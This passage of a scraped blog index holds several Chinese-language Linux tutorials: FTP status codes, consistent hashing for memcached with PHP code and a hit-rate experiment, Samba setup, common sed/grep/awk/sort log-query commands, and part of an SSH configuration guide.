命令执行失败。 211 系统状态或是系统求助响应。 212 目录的状态。 213 文件的状态。 214 求助的讯息。 215 名称系统类型。 220 新的联机服务ready。 221 服务的控制连接埠关闭，可以注销。 225 数据连结开启，但无传输动作。 226 关闭数据连接端口，请求的文件操作成功。 227 进入passive 230 使用者登入。 250 请求的文件操作完成。 257 显示目前的路径名称。 331 用户名称正确，需要密码。 332 登入时需要账号信息。 350 请求的操作需要进一部的命令。 421 无法提供服务，关闭控制连结。 425 无法开启数据链路。 426 关闭联机，终止传输。 450 请求的操作未执行。 451 命令终止：有本地的错误。 452 未执行命令：磁盘空间不足。 500 格式错误，无法识别命令。 501 参数语法错误。 502 命令执行失败。 503 命令顺序错误。 504 命令所接的参数不正确。 530 未登入。 532 储存文件需要账户登入。 550 未执行请求的操作。 551 请求的命令终止，类型未知。 552 请求的文件终止，储存位溢出。 553 未执行请求的的命令，名称不正确。 ","permalink":"https://www.oomkill.com/2016/09/vsftp-network-filesystem/","summary":"","title":"网络共享 - centos7安装vsftpd"},{"content":"Memcache应用场景 基本场景 比如有 N 台 cache 服务器（后面简称 cache），那么如何将一个对象 object 映射到 N 个 cache 上呢，你很可能会采用类似下面的通用方法计算 object 的 hash 值，然后均匀的映射到到N个cache; hash(object)%N\n如下图：\n这时，一切都运行正常，再考虑如下的两种情况：\n一个 cache服务器m down掉了（在实际应用中必须要考虑这种情况），这样所有映射到cache m的对象都会失效，怎么办，需要把cache m从cache 中移除，这时候 cache 是 $N-1$ 台，映射公式变成了 hash(object)%(N-1) 。此时数据 $3%3-1=3%2=1$ 此时，3应该在S3上，但是由于S3down机导致到S1去取，这时会未命中。如下图\n由于访问加重，需要添加 cache ，这时候 cache 是 $N+1$ 台，映射公式变成了 hash(object)%(N+1) 。1和2意味着突然之间几乎所有的 cache 都失效了。对于服务器而言，这是一场灾难，洪水般的访问都会直接冲向后台服务器。$\\frac{N-1} { N\\times (N-1)}$\n即：\n有N台服务器，变为 $N-1$ 台，即每 $N \\times (N-1)$个数中，求余相同的只有 N-1 个。命中率为：$\\frac{1}{3}$\n再来考虑第三个问题，由于硬件能力越来越强，你可能想让后面添加的节点多做点活，显然上面的 hash 算法也做不到。\n有什么方法可以改变这个状况呢，这就是 consistent hashing\u0026hellip;\n但现在一致性hash算法在分布式系统中也得到了广泛应用，研究过memcached缓存数据库的人都知道，memcached服务器端本身不提供分布式cache的一致性，而是由客户端来提供，具体在计算一致性hash时采用如下步骤：\n首先求出memcached服务器（节点）的哈希值，并将其配置到 0～232 的圆（continuum）上。\n然后采用同样的方法求出存储数据的键的哈希值，并映射到相同的圆上。\n然后从数据映射到的位置开始顺时针查找，将数据保存到找到的第一个服务器上。如果超过232仍然找不到服务器，就会保存到第一台memcached服务器上。\n从上图的状态中添加一台memcached服务器。余数分布式算法由于保存键的服务器会发生巨大变化而影响缓存的命中率，但Consistent Hashing中，只有在圆（continuum）上增加服务器的地点逆时针方向的第一台服务器上的键会受到影响，如下图所示：\n接下来使用如下算法定位数据访问到相应服务器：将数据key使用相同的函数Hash计算出哈希值，并确定此数据在环上的位置，从此位置沿环顺时针“行走”，第一台遇到的服务器就是其应该定位到的服务器。\nconsistent hash原理 基本概念 一致性哈希算法（Consistent Hashing）最早在论文《Consistent Hashing and Random Trees: Distributed Caching Protocols for Relieving Hot Spots on the World Wide Web》中被提出。简单来说，一致性哈希将整个哈希值空间组织成一个虚拟的圆环，如假设某哈希函数H的值空间为 0-232-1（即哈希值是一个32位无符号整形），整个哈希空间环如下：\n整个空间按顺时针方向组织。0和232-1在零点中方向重合。\n下一步将各个服务器使用Hash进行一个哈希，具体可以选择服务器的ip或主机名作为关键字进行哈希，这样每台机器就能确定其在哈希环上的位置，这里假设将上文中四台服务器使用ip地址哈希后在环空间的位置如下：\n接下来使用如下算法定位数据访问到相应服务器：将数据key使用相同的函数Hash计算出哈希值，并确定此数据在环上的位置，从此位置沿环顺时针“行走”，第一台遇到的服务器就是其应该定位到的服务器。\n例如我们有Object A、Object B、Object C、Object D四个数据对象，经过哈希计算后，在环空间上的位置如下：\n根据一致性哈希算法，数据A会被定为到Node A上，B被定为到Node B上，C被定为到Node C上，D被定为到Node D上。\n下面分析一致性哈希算法的容错性和可扩展性。现假设Node C不幸宕机，可以看到此时对象A、B、D不会受到影响，只有C对象被重定位到Node D。一般的，在一致性哈希算法中，如果一台服务器不可用，则受影响的数据仅仅是此服务器到其环空间中前一台服务器（即沿着逆时针方向行走遇到的第一台服务器）之间数据，其它不会受到影响。如下图所示：\n下面考虑另外一种情况，如果在系统中增加一台服务器Node X，如下图所示：\n此时对象Object A、B、D不受影响，只有对象C需要重定位到新的Node X 。一般的，在一致性哈希算法中，如果增加一台服务器，则受影响的数据仅仅是新服务器到其环空间中前一台服务器（即沿着逆时针方向行走遇到的第一台服务器）之间数据，其它数据也不会受到影响。\n综上所述，一致性哈希算法对于节点的增减都只需重定位环空间中的一小部分数据，具有较好的容错性和可扩展性。\n另外，一致性哈希算法在服务节点太少时，容易因为节点分部不均匀而造成数据倾斜问题。例如系统中只有两台服务器，其环分布如下：\n此时必然造成大量数据集中到Node A上，而只有极少量会定位到Node B上。为了解决这种数据倾斜问题，一致性哈希算法引入了虚拟节点机制，即对每一个服务节点计算多个哈希，每个计算结果位置都放置一个此服务节点，称为虚拟节点。具体做法可以在服务器ip或主机名的后面增加编号来实现。例如上面的情况，可以为每台服务器计算三个虚拟节点，于是可以分别计算 Node A#1 Node A#2 Node A#3 Node B#1 Node B#2 Node B#3 的哈希值，于是形成六个虚拟节点：\n同时数据定位算法不变，只是多了一步虚拟节点到实际节点的映射，例如定位到Node A#1 Node A#2 Node A#3 三个虚拟节点的数据均定位到Node A上。这样就解决了服务节点少时数据倾斜的问题。在实际应用中，通常将虚拟节点数设置为**==32==**甚至更大，因此即使很少的服务节点也能做到相对均匀的数据分布。\n参考: http://www.cnblogs.com/haippy/archive/2011/12/10/2282943.html\n一致性hash（consistent hash）在PHP中使用 \u0026lt;?php class ConsistentHash { public $nodes = array(); public function __construct(){ } public function generateHash($str){ return sprintf('%u',crc32($str)); } public function findNode(){ } public function lookup($key){ $tmp = $this-\u0026gt;generateHash($key); $node = current($this-\u0026gt;nodes); foreach($this-\u0026gt;nodes as $key=\u0026gt;$val){ if( $tmp \u0026lt;= $key ){ $node = $val; break; } } return $node; } public function getNode(){ var_dump($this-\u0026gt;nodes); } public function addNode($node){ $this-\u0026gt;nodes[$this-\u0026gt;generateHash($node)] = $node; ksort($this-\u0026gt;nodes); }\t} $hash = new ConsistentHash; $hash-\u0026gt;addNode('192.168.2.80:11211'); $hash-\u0026gt;addNode('192.168.2.80:11212'); $hash-\u0026gt;addNode('192.168.2.80:11213'); echo '\u0026lt;hr\u0026gt;\u0026lt;br\u0026gt;'; $hash-\u0026gt;getNode(); echo '\u0026lt;br\u0026gt;'; echo $hash-\u0026gt;generateHash('zhangsan'),'\u0026lt;br\u0026gt;'; echo $hash-\u0026gt;lookup('zhangsan'),'\u0026lt;br\u0026gt;'; ?\u0026gt; 执行结果\n这时可以看出，数据倾斜问题。\n创建虚拟节点，解决数据倾斜问题\n\u0026lt;?php class ConsistentHash{ public $nodes = array(); protected $num = 0; protected $priNode = array(); public function __construct($nodeNum){ $this-\u0026gt;num = $nodeNum; } public function generateHash($str){ return sprintf('%u',crc32($str)); } public function selectNode($key){ $tmp = $this-\u0026gt;generateHash($key); $node = current($this-\u0026gt;nodes); # 选择最小的节点作为默认值 foreach($this-\u0026gt;priNode as $key=\u0026gt;$val){ if( $tmp \u0026lt;= $key ){ $node = $val; break; } } return $node; } public function getNode(){ var_dump($this-\u0026gt;nodes); var_dump($this-\u0026gt;priNode); } public function addNode($node){\tfor($n=0;$n\u0026lt;$this-\u0026gt;num;$n++){ $this-\u0026gt;priNode[$this-\u0026gt;generateHash($node.'_'.$n)] = $node; } $this-\u0026gt;nodes[$this-\u0026gt;generateHash($node)] = $node; ksort($this-\u0026gt;priNode); }\t} $hash = new ConsistentHash(32); $hash-\u0026gt;addNode('192.168.2.80:11211'); $hash-\u0026gt;addNode('192.168.2.80:11212'); $hash-\u0026gt;addNode('192.168.2.80:11213'); $hash-\u0026gt;getNode(); echo '\u0026lt;br\u0026gt;'; echo $hash-\u0026gt;generateHash('zhangsan'),'\u0026lt;br\u0026gt;'; echo $hash-\u0026gt;generateHash('lisi'),'\u0026lt;br\u0026gt;'; echo $hash-\u0026gt;lookup('zhangsan'),'\u0026lt;br\u0026gt;'; echo $hash-\u0026gt;lookup('lisi'),'\u0026lt;br\u0026gt;'; echo $hash-\u0026gt;generateHash('wangwu'),'\u0026lt;br\u0026gt;'; echo $hash-\u0026gt;lookup('wangwu'),'\u0026lt;br\u0026gt;'; ?\u0026gt; 此时自动分配的节点为\n可看出6E-8E存在11211上，大于。35.7E-35.9E存在11212上\n一致性hash与取模命中率的对比实验 dring.rar\n实验目的 测试Memcached缓存服务器有N台变为N-台时，取模和consistent hasing算法的命中率\n实验原理 相同的硬件环境、操作系统、数据缓存环境，5个memcached节点，用两种分布式算法建立缓存，缓存命中率稳定后，减少1个节点，观察命中率的变化，知道命中率在次稳定。\n前端软件架构 config.php #←配置memcached节点信息 hash.php #←分布式算法 init.php #←初始化数据 exec.php #←减少节点后请求数据 stat.php\t#←统计平均命中率 index.html #←生成动态图表 取模算法的实验 当5台缓存服务器全部正常的情况下，此时的命中率统计图如下：\n这是查看5台缓存服务器的查询与命中次数如下：\n$ for n in {1..5};do printf \u0026quot;stats\\r\\n\u0026quot;|nc 127.0.0.1 1121$n|egrep 'get_hits|cmd_get'; done STAT cmd_get 0 STAT get_hits 0 STAT cmd_get 0 STAT get_hits 0 STAT cmd_get 0 STAT get_hits 0 STAT cmd_get 0 STAT get_hits 0 STAT cmd_get 0 STAT get_hits 0 $ for n in {1..5};do printf \u0026quot;stats\\r\\n\u0026quot;|nc 127.0.0.1 1121$n|grep item; done STAT curr_items 2044 STAT total_items 2044 STAT curr_items 1983 STAT total_items 1983 STAT curr_items 1993 STAT total_items 1993 STAT curr_items 2001 STAT total_items 2001 STAT curr_items 1979 STAT total_items 1979 这时断掉一台缓存服务器，此时的命中率从100%瞬间降至8%。\n运行一段时间后，可见命中率保持20%左右，在预热完毕后，逐步上升。\n此时查看5台缓存服务器的查询次数与命中次数，发现已经很均匀了。\n$ for n in {1..5};do printf \u0026quot;stats\\r\\n\u0026quot;|nc 127.0.0.1 1121$n|egrep 'get_hits|cmd_get'; done STAT cmd_get 0 STAT get_hits 0 STAT cmd_get 8481 STAT get_hits 6465 STAT cmd_get 8482 STAT get_hits 6476 STAT cmd_get 8482 STAT get_hits 6504 STAT cmd_get 8483 STAT get_hits 6478 经过较长时间后，可以看到命中率已经很平稳了\n一致性hash算法命中率实验 模拟出正常情况下，5台缓存服务器的命中率\n$ for n in {1..5};do printf \u0026quot;stats\\r\\n\u0026quot;|nc 127.0.0.1 1121$n|egrep 'get_hits|cmd_get'; done STAT cmd_get 0 STAT get_hits 0 STAT cmd_get 0 STAT get_hits 0 STAT cmd_get 0 STAT get_hits 0 STAT cmd_get 0 STAT get_hits 0 STAT cmd_get 0 STAT get_hits 0 $ for n in {1..5};do printf \u0026quot;stats\\r\\n\u0026quot;|nc 127.0.0.1 1121$n|grep item; done STAT curr_items 999 STAT total_items 999 STAT curr_items 1005 STAT total_items 1005 STAT curr_items 6005 STAT total_items 6005 STAT curr_items 998 STAT total_items 998 STAT curr_items 993 STAT total_items 993 此时断开1台服务器，可以见到命中率下降到73%就稳定了。\n观察一段时间后命中率逐步上升到95%\n在实战中会存在的问题 缓存雪崩的现象\n一般是由于某个节点生效，导致其他节点的缓存命中率下降，缓存中缺失的数据去数据可查询。短时间内造成数据库服务器崩溃。或，由于缓存周期性的输小，如：6小时失效一次，那么每6小时，将有一个请求““峰值”，严重情况下会导致数据库宕机。\n建议解决方案：\n将缓存的生命周期设置为随机的时间短（如4-10）小时，这样缓存不同时失效，把工作分担到各个时间点上。 可在夜间缓慢建立一部分缓存 可建立多个缓存交叉使用，做好镜像，将多个缓存失效时间错开。 ","permalink":"https://www.oomkill.com/2016/09/consistent-hash/","summary":"","title":"一致性hash在memcache中的应用"},{"content":"安装samba服务 yum install samba -y\r配置samba服务 cp /etc/samba/smb.cnf{,.`date +%F`} #\u0026lt;== 修改前备份\rvim /etc/samba/smb.cnf\rsmb配置文件 #=================== Global Settings[全局选项] ==============================\r[global]\rworkgroup = WORKGROUP #\u0026lt;==设定Samba Server所要加入的工作组或域\rserver string = Samba Server Version %v #\u0026lt;==设定注释，宏%v表示显示Samba的版本号\rnetbios name = zhi #\u0026lt;==设置Samba Server的NetBIOS名称\rmap to guest = bad user #\u0026lt;==开启匿名访问 # ----------------- Logging Options [日志选项]-----------------------------\r#设置日志文件存储位置及名称，宏%m(主机名),表示对每台访问Samba Server的机器都单独记录一个日志文件\rlog file = /var/log/samba/log.%m max log size = 50 #\u0026lt;==设置Samba Server日志文件的最大容量，单位为KB，0代表不限制\r# ---------------- Standalone Server Options[独立运行进程] ---------------------\r# 共享级别 share被弃用\rsecurity = share\rpassdb backend = tdbsam #\u0026lt;==建立安全账户管理数据库\r# =================== share settings[共享参数] =================== [web]\rcomment = Public Stuff #\u0026lt;==定义说明信息\rpath = /data/web #\u0026lt;==共享目录路径\rpublic = yes #\u0026lt;==匿名访问\rwritable = yes #\u0026lt;==可写\rread only =yes #\u0026lt;==read和writable后面的替换前面的属性\rprintable = no write list = +staff #\u0026lt;==允许写入该共享的用户 @是组\rbrowseable=yes #\u0026lt;==用来指定该共享是否可以浏览\rshare参数被去除\nWARNING: Ignoring invalid value 'share' for parameter 'security'\r配置中问题 window无法打开smb共享 windows中电脑必须在控制面板中开启次功能\n关闭后在局域网内找不到任何电脑，并不能访问smb共享\n权限无法访问解决方法 解决方法：（该方法在/etc/samba/smb.conf中有提到）\n# Set SELinux labels only on files and directories you have created. Use the\r# chcon command to temporarily change a label:\r# chcon -t samba_share_t /path/to/directory\r所以执行以上命令：即可解决问题。\n#chcon -t samba_share_t /path/to/directory\r","permalink":"https://www.oomkill.com/2016/09/samba-network-filesystem/","summary":"","title":"网络共享 - centos7安装samba"},{"content":"sed 语法\nsed '/过滤的内容/处理的命令' 文件 参数 注释说明 n 取消sed默认的输出 i 替换文件内容 r 如果有特殊字符不用转义（正则） g 全局替换 d 删除 p print打印 # 为分隔符可以用其他符号替换（最好用$ @ /）替换内容中如果有分隔符，需要将分隔符替换为别的分隔符，如果不换可将内容转义 s 为search g为globla全局替换，不加的话只替换一列\n打印\n$ sed -n '2p' 3.txt 1 $ sed -n '1,20p' 3.txt 0 1 2 3 4 5 6 8 9 10 11 12 13 14 15 16 17 18 19 问：已知一个文件内容为 aaa bbb ccc lisi 请打印出不包含lisi的内容\n文件原内容\n$ cat 1.txt -bash: ech: command not found -bash: ech: command not found -bash: ech: command not found dasda aaa bbb ccc ddd eee fff ggg 替换功能：\n$ sed -i 's#aaa#cylon#g' 1.txt $ cat 1.txt -bash: ech: command not found -bash: ech: command not found -bash: ech: command not found dasda cylon bbb ccc ddd eee fff ggg 默认不加参数会将文件原内容打印再将符合的内容打印\n$ sed '/aaa/p' 1.txt -bash: ech: command not found -bash: ech: command not found -bash: ech: command not found dasda aaa aaa bbb ccc ddd eee fff ggg 在指定文件中指定行插入数据\n$ cat test.txt 1 2 3 4 5 # $为行尾 a\\为行后追加 i\\为行前追加 c\\为替换 不加$为行首 $ sed -i \u0026quot;3a zhangsan\u0026quot; test.txt $ cat test.txt 1 2 3 zhangsan 4 -n取消默认的输出\n$ sed -n '/aaa/p' 1.txt aaa 将符合的内容删除后输出，并不操作文件\n$ sed '/aaa/d' 1.txt -bash: ech: command not found -bash: ech: command not found -bash: ech: command not found dasda bbb ccc ddd eee fff ggg 删除文件中一部分内容\n# 删除首行 sed '1d' nginx.conf # 删除1-102行 sed '1,102d' nginx.conf # 正则表达式 # 删除每行中 on sed '/on/d' nginx.conf # 删除偶数行删除偶数行 sed '0~2d' nginx.conf # 删除奇数行 sed '1~2d' nginx.conf wc 参数 说明 c 统计字节数 l 统计行数 m 统计字符数，不能与c一起用 w 统计字数，一个字被定义为由空白、跳格、或换行字符分割的字符串 L 打印最长行的字符数量 \u0026ndash;help 帮助信息 \u0026ndash;version 版本信息 $ cat -n a.html 1 000 2 111 3 222 4 333 5 444 6 555 7 666 8 777 9 888 10 999 11 aaa 12 bbb 13 ccc 14 ddd 15 eee 16 $ wc -c a.html 61 a.html $ wc -l a.html 16 a.html $ wc -w a.html 15 a.html $ wc -L a.html 3 a.html sort ★★★★ 将文件进行排序，并将排序结果标准输出。sort命令既可以从特定的文件，也可以从stdin中获取输入\n参数选项 注释说明 -b 忽略每行前面开始出的空格字符； -c 检查文件是否已经按照顺序排序； -d 排序时，处理英文字母、数字及空格字符外，忽略其他的字符； -f 排序时，将小写字母视为大写字母； -n 依照数值的大小排序 -r 以相反的顺序来排序 实例：sort将 文件/文本 的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。\n$ cat sort.txt aaa:10:1.1 ccc:30:3.3 ddd:40:4.4 bbb:20:2.2 eee:50:5.5 eee:50:5.5 $ sort sort.txt aaa:10:1.1 bbb:20:2.2 ccc:30:3.3 ddd:40:4.4 eee:50:5.5 eee:50:5.5 忽略相同行使用-u选项或者uniq：\n$ cat sort.txt aaa:10:1.1 ccc:30:3.3 ddd:40:4.4 bbb:20:2.2 eee:50:5.5 eee:50:5.5 $ sort -u sort.txt aaa:10:1.1 bbb:20:2.2 ccc:30:3.3 ddd:40:4.4 eee:50:5.5 # $ uniq sort.txt aaa:10:1.1 ccc:30:3.3 ddd:40:4.4 bbb:20:2.2 eee:50:5.5 sort的-n、-r、-k、-t选项的使用：\n$ cat sort.txt AAA:BB:CC aaa:30:1.6 ccc:50:3.3 ddd:20:4.2 bbb:10:2.5 eee:40:5.4 eee:60:5.1 # 将BB列按照数字从小到大顺序排列 $ sort -nk 2 -t: sort.txt AAA:BB:CC bbb:10:2.5 ddd:20:4.2 aaa:30:1.6 eee:40:5.4 ccc:50:3.3 eee:60:5.1 # 将CC列数字从大到小顺序排列 $ sort -nrk 3 -t: sort.txt eee:40:5.4 eee:60:5.1 ddd:20:4.2 ccc:50:3.3 bbb:10:2.5 aaa:30:1.6 AAA:BB:CC # -n是按照数字大小排序，-r是以相反顺序，-k是指定需要排序的栏位，-t指定栏位分隔符为冒号 uniq 用于报告或忽略文件中的重复行，一般与sort命令结合使用\n参数选项 注释说明 -c 在每行前面显示改行重复的次数 -d 仅打印重复出现的行 -u 仅打印不重复的行 实例：删除重复行\n$ uniq a.txt a b c d e f g h i g k 在文件中找出重复的行：\nsort file.txt | uniq -d 查找重复次数\n$ uniq -c a.txt 5 a 1 b 2 c 2 d 1 e 1 f 1 g 3 h 2 i 1 g 1 k $ uniq -d a.txt a c d h i $ uniq -u a.txt b e f g g k cut 用来显示行中的指定部分，删除文件中指定字段。cut经常用来显示文件的内容\n参数选项 注释说明 -b 以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。 -c 以字符为单位进行分割 -f 与-d一起使用，取第几列 -d 指定分隔符 实例\n$ cat 1.log i am a protester myqq is 1112222 $ cut -d \u0026quot; \u0026quot; -f4,7 1.log protester 1112222 以字节取，我们想去who命令的第三个字节 $ who root pts/0 2010-02-02 04:09 (192.168.88.1) root pts/1 2010-02-02 08:34 (192.168.88.1) lc pts/2 2010-02-02 08:44 (192.168.88.1) $ who|cut -b 3 o o 取第1、2、3和第23个字节 $ who|cut -b 1-3,23 roo2 roo2 lc 2 如果取中文的话，-c 与 -b就有差异了，-c取的是字节，而-b取得是8位2进制来计算输出的是乱码或空 $ cat a.txt 星期一 星期二 星期三 星期四 星期五 星期六 星期日 $ cut -b 3 a.txt � � $ cut a.txt -c 3 一 二 三 四 五 六 日 grep Global search Regular Expression(RE) and Print out the line，全面搜索正则表达式并把行打印出来；是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。\n过滤，将想要的和不想要的去除\n参数 说明 ==-E== 同egrep同时过滤多个字符串，使grep可以使用正则表达式 -v 翻转查找，查找除了匹配到结果之外的信息 -B Num 除了显示匹配的一行之外，并显示该行之前的num行 -A Num 除了显示匹配的一行之外，并显示改行之后的num行 -C Num 除了显示匹配的一行之外，并显示改行之前后各num行 -o 输出匹配字符，而不是默认的整行输出 -i 不区分大小写 -n 讲匹配出的结果在文件所在的行号打印 -c 打印匹配到的行数 -H 在匹配到符合行之前打印文件名 \u0026ndash;color=auto 给匹配倒的字符串加颜色（不是整行。关键字高亮显示） 实例\n显示/etc/services 下3306和1521 端口信息 $ grep -E \u0026quot;3306|1521\u0026quot; /etc/services mysql 3306/tcp # MySQL mysql 3306/udp # MySQL ncube-lm 1521/tcp # nCube License Manager ncube-lm 1521/udp # nCube License Manager 过滤出文件内指定字符串 $ cat text.txt zhangsan lisi oldbl $ grep \u0026quot;lisi\u0026quot; text.txt lisi 排除指定字符 $ grep -v \u0026quot;lisi\u0026quot; text.txt zhangsan oldbl $ grep -n \u0026quot;555\u0026quot; a.html 6:555 一个文件有100行，只看20~30行 # 方法1 $ grep 30 -B 10 test.txt 20 21 22 23 24 25 26 27 28 29 30 # 方法2 $ head -30 3.txt|tail -11 20 21 22 23 24 25 26 27 28 29 30 列出文件名 $ grep -H root /etc/passwd /etc/passwd:root:x:0:0:root:/root:/bin/bash /etc/passwd:operator:x:11:0:operator:/root:/sbin/nologin 日志查询中常用命令 打印一段时间的日志\nsed -n '/2019-12-28 11:26/,/2019-12-28 12:13/p' nohup.out 输出日志文件中的某个日期中的ERROR的行\nsed -n '/^2016-06-21.*ERROR/p' nohup.out 统计http相应状态码\ncat looklinix.com_access.log | cut -d '\u0026quot;' -f3 | cut -d ' ' -f2 | sort | uniq -c | sort 使用awk\nawk '{print $9}' looklinix.com_access.log | sort | uniq -c | sort 列出404的接口\nawk '($9 ~ /404/)' looklinix.com_access.log | awk '{print $7}' | sort | uniq -c | sort -r 检查404请求来自哪里\nawk -F \\\u0026quot; '($2 ~ \u0026quot;/survey/report/na\u0026quot;){print $1}' looklinix.com_access.log | awk '{print $1}' | sort | uniq -c | sort –r 查询x 分钟内访问最多的前 10 个IP\nday hour minutes\nawk -vDate=`date -d'now-30 minutes' +[%d/%b/%Y:%H:%M:%S` '$4 \u0026gt; Date {print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -n 10 查询请求URL数量排行\nawk '{print $7}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -n 50 统计所有的IP请求量\nawk '{print $1}' access.log | sort -n | uniq | wc -l 统计某一时间段的IP请求量\ngrep \u0026quot;07/Apr/2017:0[4-5]\u0026quot; access.log | awk '{print $1}' | sort | uniq -c| sort -nr | wc -l 统计IP请求数量大于一个值的排行\nawk '{print $1}' access.log | sort -n |uniq -c |awk '{if($1 \u0026gt;100) print $0}'|sort -rn 列出请求时间超过3s的接口\ncat access.log|awk '($NF \u0026gt; 3){print $7}'|sort -n|uniq -c|sort -nr|head -20 获取每分钟的请求数量并输出成csv文件\ncat access.log | awk '{print substr($4,14,5)}' | uniq -c | awk '{print $2\u0026quot;,\u0026quot;$1}' \u0026gt; access.csv 查看搜索引擎爬虫\n# 百度爬虫 降序 cat access.log | grep \u0026quot;Baiduspider\u0026quot; | awk '{print $7}' | sort | uniq -c | sort -r # 谷歌爬虫降序 cat access.log | grep \u0026quot;Googlebot\u0026quot; | awk '{print $7}' | sort | uniq -c | sort -r # 谷歌爬虫404的次数 grep 'Googlebot' access.log |grep '404' | wc -l ","permalink":"https://www.oomkill.com/2016/08/awesome-linux-log-command/","summary":"","title":"长期总结 - Linux日志查询命令"},{"content":"什么是 SSH ？ SSH全称(SecureSHell)是一种网络协议，顾名思义就是非常安全的shell，主要用于计算机间加密传输。早期，互联网通信都是基于明文通信，一旦被截获，内容就暴露无遗。1995年，芬兰学者Tatu Ylonen设计了SSH协议，将登录信息全部加密，成为互联网安全的一个基本解决方案，迅速在全世界获得推广，目前已经成为Linux系统的标准配置。\nSSH服务是由OpenSSH服务端软件OpenSSH和客户端（常见的由SSH，SecureCRT，Xshell，putty）组成，默认使用22端口提供服务，有两个不兼容的ssh协议版本，分别为1.x和2.x。\nSSH协议目前有SSH1和SSH2两个主流版本，SSH2协议兼容SSH1，强烈建议使用SSH2版本。目前实现SSH1和SSH2协议的主要软件有OpenSSH 和SSH Communications Security Corporation　公司的SSH Communications 软件。前者是OpenBSD组织开发的一款免费的SSH软件，后者是商业软件，因此在linux、FreeBSD、OpenBSD 、NetBSD等免费类UNIX系统种，通常都使用OpenSSH作为SSH协议的实现软件。\n$ rpm -qa openssh openssl openssl-1.0.1e-30.el6.x86_64 openssh-5.3p1-104.el6.x86_64 SSH1.x\n每台ssh服务器主机都可以使用rsa加密方式来产生一个1024bit的RSAKey，这个RSA的加密方式就是用来产生公钥与私钥的算法之一，SSH1.x的整个联机加密步骤如下： 当SSH服务启动时，会产生一个768-bit的临时公钥（sshd_config配置文件中ServerKeyBits 768）存放在server中\n# centos5为768 centos6为1024 $ grep ServerKey /etc/ssh/sshd_config #ServerKeyBits 1024 当客户端联机请求传送过来时，服务器就会将这个768-bit的公钥传给客户端，此时客户端会将此公钥与先前存储的公钥进行对比，看是否一致。判断标准是服务器端联机用户目录下~/.ssh/know_hosts文件的内容（linux客户端）\n$ ssh -p22 lamp@192.168.65.62 $ ll .ssh/known_hosts -rw-r--r--. 1 root root 395 Jun 16 13:15 .ssh/known_hosts windows SecureCRT图示 在客户端接收到这个768-bit的Server Key后，客户端本地也会产生一个256bit的私钥（private key或host key），并且以加密的方式（具体的加密算法由客户端在服务器提供的所有可用算法中选择，默认为3DES算法），将Server key与host\nSSHD_CONFIG配置文件详解 参数选项 注释说明 Port Num 指定sshd服务器侦听端口num。将num改成非标准端口可以提高安全性。默认端口为22。 Protocol 1|2|2,1 指定 sshd 支持的SSH协议的版本号。'1'和'2'表示仅仅支持SSH-1和SSH-2协议。\u0026quot;2,1\u0026quot;表示同时支持SSH-1和SSH-2协议。 PubkeyAuthentication 是否允许公钥认证。仅可以用于SSH-2。默认值为\u0026quot;yes\u0026quot;。 ListenAddress 0.0.0.0 监听的IP，默认监听所有地址（可指定多个监听的地址），可使用以下格式：\nListenAddress\nhost | IPv4_addr | IPv6_addr\nListenAddress host | IPv4_addr:port\nListenAddress [host|IPv6_addr]:port\n举例说明：如果您有两个 IP，分别是 192.168.0.100 及 192.168.2.20 ，那么只想要开放 192.168.0.100 时，就可以写如同下面的样式：ListenAddress 192.168.0.100只监听来自 192.168.0.100 这个 IP 的SSH联机。 HostKey /etc/ssh/ssh_host_key SSH version 1 使用的私钥 HostKey /etc/ssh/ssh_host_rsa_key SSH version 2 使用的 RSA 私钥 HostKey /etc/ssh/ssh_host_dsa_key SSH version 2 使用的 DSA 私钥 KeyRegenerationInterval 1h 由前面联机的说明可以知道， version 1 会使用 server 的 Public Key ，那么如果这个 Public Key 被偷的话，岂不完蛋？所以需要每隔一段时间来重新建立一次！这里的时间为秒！ ServerKeyBits 768 定义服务器密匙的位数，centos5 768，centos6 1024 SyslogFacility 指定 sshd(8) 将日志消息通过哪个日志子系统(facility)发送。有效值是：DAEMON, USER, AUTH(默认), LOCAL0, LOCAL1, LOCAL2, LOCAL3, LOCAL4, LOCAL5, LOCAL6, LOCAL7 LogLevel 指定 sshd(8) 的日志等级(详细程度)。可用值如下：QUIET, FATAL, ERROR, INFO(默认), VERBOSE, DEBUG, DEBUG1, DEBUG2, DEBUG3\nDEBUG 与 DEBUG1 等价；DEBUG2 和 DEBUG3 则分别指定了更详细、更罗嗦的日志输出。\n注：比 DEBUG 更详细的日志可能会泄漏用户的敏感信息，因此反对使用。 LoginGraceTime 2m 当使用者连上 SSH server 之后，会出现输入密码的画面，在该画面中，在多久时间内没有成功连上 SSH server ，就断线！时间为默认为秒，可加时间标志m,h PermitRootLogin 是否允许 root 登录。可用值如下：\n\u0026ldquo;yes\u0026rdquo;(默认) 表示允许。\u0026ldquo;no\u0026quot;表示禁止。\n\u0026ldquo;without-password\u0026quot;表示禁止使用密码认证登录。\n\u0026ldquo;forced-commands-only\u0026quot;表示只有在指定了 command 选项的情况下才允许使用公钥认证登录。同时其它认证方法全部被禁止。这个值常用于做远程备份之类的事情。 StrictModes 指定是否要求 sshd 在接受连接请求前对用户主目录和相关的配置文件进行宿主和权限检查。强烈建议使用默认值\u0026quot;yes\u0026quot;来预防可能出现的低级错误。 MaxAuthTries 指定每个连接最大允许的认证次数。默认值是 6 。如果失败认证的次数超过这个数值的一半，连接将被强制断开，且会生成额外的失败日志消息。 PubkeyAuthentication 是否允许公钥认证。仅可以用于SSH-2。默认值为\u0026quot;yes\u0026quot;。 AuthorizedKeysFile 存放该用户可以用来登录的 RSA/DSA 公钥。该指令中可以使用下列根据连接时的实际情况进行展开的符号：\n%% 表示\u0026rsquo;%\u0026rsquo;\n%h 表示用户的主目录\n%u 表示该用户的用户名。\n经过扩展之后的值必须要么是绝对路径，要么是相对于用户主目录的相对路径。默认值是\u0026quot;.ssh/authorized_keys\u0026quot;。 IgnoreRhosts 是否在 RhostsRSAAuthentication 或 HostbasedAuthentication 过程中忽略 .rhosts 和 .shosts 文件。不过 /etc/hosts.equiv 和 /etc/shosts.equiv 仍将被使用。推荐设为默认值\u0026quot;yes\u0026quot; IgnoreUserKnownHosts 是否在 RhostsRSAAuthentication 或 HostbasedAuthentication 过程中忽略用户的 ~/.ssh/known_hosts 文件。\n默认值是\u0026quot;no\u0026quot;。为了提高安全性，可以设为\u0026quot;yes\u0026quot;。 PasswordAuthentication 